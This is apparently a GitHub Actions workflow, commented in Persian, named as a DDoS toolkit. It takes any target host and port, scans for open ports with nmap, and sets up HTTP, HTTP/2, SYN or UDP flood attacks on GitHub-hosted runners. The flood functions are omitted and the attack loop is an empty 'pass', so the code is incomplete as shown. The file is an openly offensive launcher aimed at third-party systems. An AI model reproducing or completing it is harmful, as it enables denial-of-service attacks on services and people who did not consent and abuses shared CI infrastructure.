name: Advanced DDoS Toolkit with Auto-Discovery

on:
  workflow_dispatch:
    inputs:
      attack:
        description: 'نوع حمله'
        required: true
        default: 'l7_http_flood'
        type: choice
        options:
          - l7_http_flood
          - l4_syn_flood
          - l7_http2_flood
          - l4_udp_flood
      target:
        description: 'آدرس هدف (example.com یا یک IP)'
        required: true
      port:
        description: 'پورت هدف (auto = اسکن خودکار)'
        required: true
        default: 'auto'
      duration:
        description: 'مدت زمان حمله (ثانیه)'
        required: true
        default: '60'
      threads:
        description: 'تعداد نخ‌ها'
        required: true
        default: '50'

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Install Tools
        run: |
          sudo apt-get update
          sudo apt-get install -y nmap
          pip3 install aiohttp rich httpx websockets scapy python-nmap

      - name: Execute Reconnaissance & Attack
        env:
          TARGET_HOST: ${{ github.event.inputs.target }}
          TARGET_PORT: ${{ github.event.inputs.port }}
          ATTACK_TYPE: ${{ github.event.inputs.attack }}
          DURATION: ${{ github.event.inputs.duration }}
          THREADS: ${{ github.event.inputs.threads }}
        run: |
          python3 - << 'PYEOF'
          import os, sys, time, socket, threading, random, nmap
          # ... (تمامی توابع کمکی resolve_target, scan_open_ports و 
          #      توابع حملات l7_http_flood, l4_syn_flood و غیره 
          #      که در بخش‌های قبلی نوشتیم، در اینجا تعریف می‌شن.)

          # --- بخش اصلی اجرای منطق ---
          TARGET = os.environ["TARGET_HOST"]
          
          # 1. پیدا کردن IP هدف
          target_ip = resolve_target(TARGET)
          if target_ip is None:
              print("❌ نمی‌تونم IP هدف رو پیدا کنم.")
              sys.exit(1)
          print(f"🎯 هدف: {target_ip}")

          # 2. تصمیم‌گیری در مورد پورت
          target_ports = []
          if os.environ["TARGET_PORT"].lower() == 'auto':
              # اسکن خودکار پورت‌ها
              open_ports = scan_open_ports(target_ip)
              if not open_ports:
                  print("❌ هیچ پورت بازی پیدا نشد.")
                  sys.exit(1)
              target_ports = [p['port'] for p in open_ports]
              print(f"🎯 پورت‌های هدف: {target_ports}")
          else:
              target_ports = [int(os.environ["TARGET_PORT"])]

          # 3. اجرای حمله روی پورت(ها)
          ATTACK_TYPE = os.environ["ATTACK_TYPE"]
          for port in target_ports:
              # اینجا تابع run_attack رو با IP، پورت و سایر پارامترها صدا بزن
              pass

          PYEOF
